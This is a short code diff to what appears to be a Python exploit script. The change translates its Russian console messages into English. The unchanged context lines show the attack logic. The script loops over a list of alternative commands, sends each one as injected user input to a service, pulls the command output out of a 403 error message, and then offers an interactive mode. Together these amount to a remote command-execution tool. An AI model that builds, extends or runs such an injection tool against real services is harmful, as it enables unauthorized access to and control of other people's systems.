@@ -141,7 +141,7 @@ if __name__ == "__main__":
         ]
         
         for cmd in alternative_commands:
-            print(f"\n[+] Пробуем: {cmd}")
+            print(f"\n[+] Trying: {cmd}")
             user_input = cmd.replace("'", '"')
             
             payload = { 
@@ -153,12 +153,12 @@ if __name__ == "__main__":
                 
                 if response.status_code == 403:
                     output = response.json()['message'].split("The input \"")[1][:-2]
-                    print(f"Результат: {output}")
+                    print(f"Result: {output}")
                 else:
-                    print(f"Статус: {response.status_code}")
+                    print(f"Status: {response.status_code}")
                     
             except Exception as e:
-                print(f"Ошибка: {e}")
+                print(f"Error: {e}")
     
     choice = input("\n[+] Interactive regime? (y/n): ")
     if choice.lower() in ['y', 'yes']:
